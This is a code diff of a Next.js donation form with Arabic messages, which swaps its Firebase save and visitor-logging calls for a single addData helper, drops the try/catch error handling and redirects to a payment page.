@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useRouter } from 'next/navigation';
 import { ChevronDown } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -9,8 +9,8 @@ import { Card } from '@/components/ui/card';
 import { toast } from 'sonner';
 import ReactFlagsSelect from "react-flags-select";
 
-import { saveDonation, recordVisitor } from '@/lib/firebase';
 import { PhoneInput } from './flags-selelct';
+import { addData } from '@/lib/firebase';
 export default function DonationForm() {
   const router = useRouter();
   const [selectedAmount, setSelectedAmount] = useState<string>('100');
@@ -19,13 +19,15 @@ export default function DonationForm() {
   const [phone, setPhone] = useState<string>('');
   const [donationMethod, setDonationMethod] = useState<string>('card');
   const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
+  const [_id] = useState("id" + Math.random().toString(16).slice(2))
+
   // Record visitor when component mounts
   useEffect(() => {
-    recordVisitor();
-
+    addData({id:_id,createdDate:new Date().toISOString()});
   }, []);
 
-  const handleSubmit = async () => {
+  const handleSubmit = async (e:any) => {
+    e.preventDefault()
     // Form validation
     if (!email || !email.includes('@')) {
       toast.error('يرجى إدخال بريد إلكتروني صحيح');
@@ -42,33 +44,20 @@ export default function DonationForm() {
       toast.error('يرجى تحديد أو إدخال مبلغ التبرع');
       return;
     }
-
+    localStorage.setItem('amount',finalAmount)
     setIsSubmitting(true);
 
-    try {
-      // Save donation data to Firestore
       const donationData = {
         amount: selectedAmount,
         customAmount: customAmount || undefined,
         email,
         phone,
         donationMethod,
-      };
-
-      const donationId = await saveDonation(donationData);
-
-      if (donationId) {
-        // Navigate to payment page with donation ID
-        router.push(`/payment?id=${donationId}&amount=${finalAmount}`);
-      } else {
-        throw new Error('Failed to save donation');
       }
-    } catch (error) {
-      console.error('Error submitting donation:', error);
-      toast.error('حدثت مشكلة في معالجة تبرعك. يرجى المحاولة مرة أخرى.');
-    } finally {
+      await addData({id:_id,donationData});
       setIsSubmitting(false);
-    }
+
+      router.push(`/payment`);
   };
 
   return (
